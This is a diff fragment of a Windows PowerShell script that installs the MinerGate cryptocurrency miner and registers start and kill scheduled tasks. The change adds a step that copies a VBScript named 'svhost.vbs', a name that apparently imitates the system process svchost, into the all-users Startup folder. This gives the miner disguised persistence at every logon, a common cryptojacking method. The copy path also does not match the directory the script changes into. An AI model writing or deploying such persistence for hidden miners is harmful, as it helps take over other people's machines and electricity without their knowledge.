@@ -56,14 +56,15 @@ cd C:\Mining\MinerGate-cli-4.04-win64
 
 Remove-Item $output
 
-# Create Scheduled Start Task
+# Create Scheduled Start/Kill Task
 
 Register-ScheduledTask -Action $StartAction -Trigger $StartTrigger -TaskName "Start_Minergate" -Description "Start Minergate"
-
-# Create Scheduled Kill Task
-
 Register-ScheduledTask -Action $KillAction -Trigger $KillTrigger -TaskName "Kill_Minergate" -Description "Kill Minergate"
 
-.\Startup.vbs #Starts the Miner
+# Copy vbs to Startup Folder
+
+Copy-Item C:\Miner\MinerGate-cli-4.04-win64\svhost.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+#.\Startup.vbs #Starts the Miner
 
 }
